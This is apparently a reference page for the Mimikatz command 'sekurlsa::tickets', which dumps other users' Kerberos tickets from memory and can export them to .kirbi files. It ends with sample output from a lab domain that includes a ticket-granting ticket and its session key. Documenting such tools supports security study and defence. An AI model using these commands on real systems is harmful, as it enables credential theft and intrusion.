# tickets

`sekurlsa::tickets` lists Kerberos tickets belonging to all authenticated users on the target server/workstation. Unlike [`kerberos::list`](../process/list.md), sekurlsa uses memory reading and is not subject to key export restrictions. Sekurlsa can also access tickets of others sessions (users). It has the following command line argument:

* `/export`: tickets are exported in `.kirbi` files. They start with user's LUID and group number (0 = TGS, 1 = client ticket(?) and 2 = TGT). The tickets are saved in the current directory.

{% hint style="warning" %}
This command requires elevated privileges (by previously running [`privilege::debug`](../privilege/debug.md) or by executing Mimikatz as the `NT-AUTHORITY\SYSTEM` account).
{% endhint %}

```
mimikatz # sekurlsa::tickets

Authentication Id : 0 ; 697146 (00000000:000aa33a)
Session           : Service from 0
User Name         : MediaAdmin$
Domain            : hacklab
Logon Server      : DC
Logon Time        : 10/17/2021 4:22:01 AM
SID               : S-1-5-21-2725560159-1428537199-2260736313-1427

         * Username : MediaAdmin$
         * Domain   : HACKLAB.LOCAL
         * Password : (null)

        Group 0 - Ticket Granting Service

        Group 1 - Client Ticket ?

        Group 2 - Ticket Granting Ticket
         [00000000]
           Start/End/MaxRenew: 10/17/2021 4:22:01 AM ; 10/17/2021 2:22:01 PM ; 10/24/2021 4:22:01 AM
           Service Name (02) : krbtgt ; HACKLAB.LOCAL ; @ HACKLAB.LOCAL
           Target Name  (02) : krbtgt ; hacklab.local ; @ HACKLAB.LOCAL
           Client Name  (01) : MediaAdmin$ ; @ HACKLAB.LOCAL ( hacklab.local )
           Flags 40e10000    : name_canonicalize ; pre_authent ; initial ; renewable ; forwardable ;
           Session Key       : 0x00000012 - aes256_hmac
             1351322f734539c08a78792f642fc4fd4ff8aea1fe3b4a0edf83778b5ed878e9
           Ticket            : 0x00000012 - aes256_hmac       ; kvno = 2        [...]
```
